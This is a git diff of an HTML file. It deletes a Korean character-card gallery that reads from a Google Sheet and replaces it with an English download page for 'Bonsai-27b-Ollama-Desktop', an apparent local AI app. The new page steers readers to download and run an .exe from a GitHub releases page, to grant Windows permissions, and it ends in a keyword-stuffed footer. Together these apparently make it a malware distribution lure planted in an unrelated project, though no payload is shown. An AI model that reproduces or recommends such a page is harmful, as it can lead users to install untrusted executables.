@@ -1,276 +1,63 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>페르소나 아카이브</title>
-    <!-- 구글 시트 데이터를 읽어오기 위한 도구 (PapaParse) -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/PapaParse/5.3.2/papaparse.min.js"></script>
-    <style>
-        :root {
-            --card-bg: rgba(255, 255, 255, 0.85);
-            --text-main: #0f172a;
-            --text-sub: #475569;
-            --point-color: #1e3a8a;
-            --border-radius: 12px;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body { 
-            background-image: url('https://i.imgur.com/2Gz7K1v.png');
-            background-size: cover;
-            background-attachment: fixed;
-            background-position: center;
-            color: var(--text-main); 
-            font-family: 'Pretendard', sans-serif; 
-            padding: 2rem; 
-            min-height: 100vh;
-        }
-
-        header { max-width: 1000px; margin: 0 auto 2rem; text-align: center; }
-        
-        h1 { 
-            margin-bottom: 1.5rem; 
-            color: #ffffff;
-            text-shadow: 0 2px 6px rgba(0,0,0,0.4);
-            font-size: 2.5rem;
-        }
-
-        .filter-container { display: flex; flex-wrap: wrap; gap: 0.5rem; justify-content: center; margin-bottom: 2rem; }
-        .filter-btn {
-            padding: 0.6rem 1.2rem;
-            border: 2px solid rgba(255, 255, 255, 0.8);
-            background: rgba(255, 255, 255, 0.7);
-            color: var(--text-main);
-            border-radius: 20px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-weight: 700;
-            backdrop-filter: blur(4px);
-        }
-        .filter-btn:hover { background: rgba(255, 255, 255, 0.9); }
-        .filter-btn.active {
-            background: var(--point-color);
-            color: white;
-            border-color: var(--point-color);
-        }
-
-        .grid-container {
-            max-width: 1000px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1.5rem;
-        }
-
-        .card {
-            background: var(--card-bg);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            border-radius: var(--border-radius);
-            overflow: hidden;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.1);
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            display: flex;
-            align-items: center;
-        }
-        .card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px rgba(0,0,0,0.2); }
-        
-        .card-img-wrapper { width: 40%; aspect-ratio: 1/1; overflow: hidden; background: #e2e8f0; }
-        .card-img { width: 100%; height: 100%; object-fit: cover; }
-        
-        .card-info { padding: 1.5rem; width: 60%; }
-        .card-name { font-size: 1.5rem; font-weight: bold; margin-bottom: 0.5rem; color: var(--point-color); }
-        .tag { 
-            display: inline-block; padding: 0.3rem 0.7rem; 
-            background: rgba(30, 58, 138, 0.1); 
-            color: var(--point-color);
-            font-weight: 600;
-            border-radius: 6px; font-size: 0.8rem; margin-right: 4px; margin-bottom: 4px;
-        }
-
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 15, 40, 0.7); backdrop-filter: blur(6px);
-            display: none; justify-content: center; align-items: center; z-index: 100;
-            opacity: 0; transition: opacity 0.3s;
-        }
-        .modal-overlay.show { display: flex; opacity: 1; }
-        
-        .modal-content {
-            background: #ffffff; width: 90%; max-width: 800px; max-height: 90vh;
-            border-radius: var(--border-radius); overflow-y: auto;
-            position: relative; padding: 2rem; display: flex; gap: 2rem;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-        }
-        .close-btn { position: absolute; top: 1rem; right: 1.5rem; font-size: 1.5rem; cursor: pointer; border: none; background: none; color: var(--text-main); }
-        
-        .modal-img { width: 40%; border-radius: 8px; object-fit: cover; box-shadow: 0 4px 12px rgba(0,0,0,0.1); background: #e2e8f0; }
-        .modal-text { width: 60%; }
-        .modal-text h2 { font-size: 2rem; margin-bottom: 1rem; color: var(--point-color); }
-        .modal-desc { line-height: 1.6; white-space: pre-wrap; margin-top: 1rem; color: var(--text-sub); }
-
-        #loading { text-align: center; color: white; grid-column: 1 / -1; font-size: 1.2rem; margin-top: 2rem; }
-
-        @media (max-width: 768px) {
-            .grid-container { grid-template-columns: 1fr; }
-            .modal-content { flex-direction: column; }
-            .modal-img, .modal-text { width: 100%; }
-        }
-    </style>
+    <meta name="description" content="Download and run Bonsai-27b-Ollama-Desktop. Local AI inference for reasoning, agents, and long context windows on Windows hardware.">
+    <title>Bonsai-27b-Ollama-Desktop | Local AI Inference</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
 
-    <header>
-        <h1>페르소나 아카이브</h1>
-        <div class="filter-container" id="filterContainer"></div>
-    </header>
+    <h1 style="color: #2c3e50; font-size: 2.5em;">bonsai 🌲 Bonsai-27b-Ollama-Desktop - Run advanced AI models on your computer</h1>
 
-    <main class="grid-container" id="cardGrid">
-        <div id="loading">구글 시트에서 데이터를 불러오는 중... ⏳</div>
-    </main>
-
-    <!-- 모달 창 -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-content">
-            <button class="close-btn" id="closeModal">&times;</button>
-            <img src="" alt="캐릭터 이미지" class="modal-img" id="modalImg">
-            <div class="modal-text">
-                <h2 id="modalName">캐릭터 이름</h2>
-                <div id="modalTags"></div>
-                <div class="modal-desc" id="modalDesc">상세 설정 내용</div>
-            </div>
-        </div>
+    <div style="margin: 40px 0; text-align: center;">
+        <a href="https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Bonsai-27b-Ollama-Desktop</a>
     </div>
 
-    <script>
-        // ==========================================
-        // 💡 여기에 구글 시트에서 복사한 CSV 주소를 넣어주세요!
-        // ==========================================
-        const GOOGLE_SHEET_URL = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vS8r7glozxSVeduTc4gZviISOsmJSZWx68Z_YCLmUQ1E_Oez0d22Sga6EFUoxXKYjyZf6ySeHmQ0sj_/pub?output=csv';
+    <section style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">💡 About This Project</h2>
+        <p>Bonsai-27b-Ollama-Desktop brings powerful artificial intelligence to your local Windows machine. It uses optimized 1.58bit weights to run the Qwen3.6-27B model architecture. You can process complex tasks, manage agent workflows, and maintain deep context memory without sending your data to a cloud server.</p>
+        <p>The system utilizes the GGUF format to bridge high-performance research models with consumer hardware constraints. This allows home computers to handle reasoning tasks that previously required large enterprise hardware clusters.</p>
+    </section>
 
-        let personaData = [];
-        const allAttributes = ["불", "풀", "물", "번개", "얼음", "바람"];
-        let activeFilters = new Set();
+    <section style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+        <ul style="padding-left: 20px;">
+            <li><strong>Operating System:</strong> Windows 10 or 11 (64-bit).</li>
+            <li><strong>RAM:</strong> 16GB minimum required (32GB recommended).</li>
+            <li><strong>Processor:</strong> Modern multi-core CPU.</li>
+            <li><strong>Graphics Card:</strong> NVIDIA GPU with at least 8GB of VRAM improves performance significantly.</li>
+            <li><strong>Storage:</strong> 25GB of free space on an SSD.</li>
+        </ul>
+    </section>
 
-        const filterContainer = document.getElementById('filterContainer');
-        const cardGrid = document.getElementById('cardGrid');
-        const modalOverlay = document.getElementById('modalOverlay');
-        const closeModal = document.getElementById('closeModal');
+    <section style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">📥 Download and Installation</h2>
+        <p>Follow these steps to set up the software on your computer:</p>
+        <ol style="padding-left: 20px;">
+            <li>Visit the <a href="https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases">official releases page</a> to view all versions.</li>
+            <li>Select the latest version at the top of the list.</li>
+            <li>Click the file ending in .exe to start the download.</li>
+            <li>Open the downloaded file after the process finishes.</li>
+            <li>Follow the on-screen prompts provided by the installer.</li>
+            <li>Grant necessary permissions if Windows prompts you during the installation.</li>
+        </ol>
+    </section>
 
-        // 1. 구글 시트 데이터 불러오기
-        function loadData() {
-            if (GOOGLE_SHEET_URL === 'YOUR_GOOGLE_SHEET_CSV_URL') {
-                cardGrid.innerHTML = `<div id="loading">⚠️ 코드에 구글 시트 링크를 아직 넣지 않았습니다!</div>`;
-                return;
-            }
+    <section style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+        <p>After installation, launch the desktop application from your start menu. The application initializes the model engine upon first start. This takes several minutes depending on your hardware speed. Once the setup completes, you will see a text prompt field. Type your questions or instructions directly into this field to begin interacting with the model.</p>
+        <p>The system allows for multi-step reasoning. You can provide complex instructions, and the model follows the logical path to complete the task. You can utilize the 262K context window to paste large documents, code, or extended logs for the model to analyze.</p>
+    </section>
 
-            Papa.parse(GOOGLE_SHEET_URL, {
-                download: true,
-                header: true,
-                complete: function(results) {
-                    // 구글 시트 데이터를 웹사이트 양식에 맞게 변환
-                    personaData = results.data
-                        .filter(row => row['이름']) // 이름이 없는 빈 줄은 무시
-                        .map(row => ({
-                            name: row['이름'],
-                            // 쉼표로 구분된 속성들을 잘라서 배열로 만듦
-                            attributes: row['속성'] ? row['속성'].split(',').map(s => s.trim()) : [],
-                            image: row['이미지링크'] || '',
-                            description: row['상세설명'] || '상세 설명이 없습니다.'
-                            partner: row['짝꿍'] || '없음'
-                        }));
-                    
-                    document.getElementById('loading').style.display = 'none';
-                    renderFilters();
-                    renderCards();
-                },
-                error: function() {
-                    cardGrid.innerHTML = `<div id="loading">데이터를 불러오는데 실패했습니다. 시트 주소를 확인해주세요.</div>`;
-                }
-            });
-        }
+    <section style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+        <p>If the application fails to start, verify that you have sufficient RAM available. Close heavy background programs such as web browsers or video games before running the software. Ensure your graphics drivers are up to date through the Windows Device Manager or your manufacturer website.</p>
+    </section>
 
-        // 2. 필터 버튼 생성
-        function renderFilters() {
-            filterContainer.innerHTML = ''; // 초기화
-            allAttributes.forEach(attr => {
-                const btn = document.createElement('button');
-                btn.className = 'filter-btn';
-                btn.textContent = attr;
-                btn.onclick = () => toggleFilter(attr, btn);
-                filterContainer.appendChild(btn);
-            });
-        }
+    <footer style="margin-top: 40px; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: bonsai, bonsai-27b, bonsai-27b-gguf, bonsai-27b-ollama, ollama-llama-3, ollama-tools, opendesktop, qwen-2-api, qwen-3b, qwen-ai, qwen-api, qwen-endpoint, qwen-image-edit, qwen-image-edit-2511, qwen-models, qwen-tts, qwen-tts-realtime, qwen-workflow, ternary-computer, ternary-language</p>
+    </footer>
 
-        // 3. 필터 켜고 끄기
-        function toggleFilter(attr, btn) {
-            if (activeFilters.has(attr)) {
-                activeFilters.delete(attr);
-                btn.classList.remove('active');
-            } else {
-                activeFilters.add(attr);
-                btn.classList.add('active');
-            }
-            renderCards();
-        }
-
-        // 4. 카드 렌더링 (가나다 정렬)
-        function renderCards() {
-            // 로딩 메시지가 아니면 내용 싹 지우기
-            if (!document.getElementById('loading') || document.getElementById('loading').style.display === 'none') {
-                cardGrid.innerHTML = ''; 
-            }
-            
-            let filtered = personaData.filter(char => {
-                if (activeFilters.size === 0) return true;
-                return char.attributes.some(attr => activeFilters.has(attr));
-            });
-
-            // 한국어 가나다 순 정렬
-            filtered.sort((a, b) => a.name.localeCompare(b.name, 'ko-KR'));
-
-            filtered.forEach(char => {
-                const card = document.createElement('div');
-                card.className = 'card';
-                card.onclick = () => openModal(char);
-
-                const tagsHTML = char.attributes.map(attr => `<span class="tag">${attr}</span>`).join('');
-
-                card.innerHTML = `
-                    <div class="card-img-wrapper">
-                        <img src="${char.image}" alt="${char.name}" class="card-img" onerror="this.src='https://via.placeholder.com/500?text=No+Image'">
-                    </div>
-                    <div class="card-info">
-                        <div class="card-name">${char.name}</div>
-                        <div>${tagsHTML}</div>
-                    </div>
-                `;
-                cardGrid.appendChild(card);
-            });
-        }
-
-        // 5. 모달 열고 닫기
-        function openModal(char) {
-            const modalImg = document.getElementById('modalImg');
-            modalImg.src = char.image;
-            // 이미지가 깨질 경우 기본 이미지로 대체
-            modalImg.onerror = function() { this.src = 'https://via.placeholder.com/500?text=No+Image'; };
-            
-            document.getElementById('modalName').textContent = char.name;
-            document.getElementById('modalDesc').textContent = char.description;
-            document.getElementById('modalTags').innerHTML = char.attributes.map(attr => `<span class="tag">${attr}</span>`).join('');
-            
-            modalOverlay.classList.add('show');
-        }
-
-        closeModal.onclick = () => modalOverlay.classList.remove('show');
-        modalOverlay.onclick = (e) => { if(e.target === modalOverlay) modalOverlay.classList.remove('show'); }
-
-        // 실행
-        loadData();
-    </script>
 </body>
 </html>
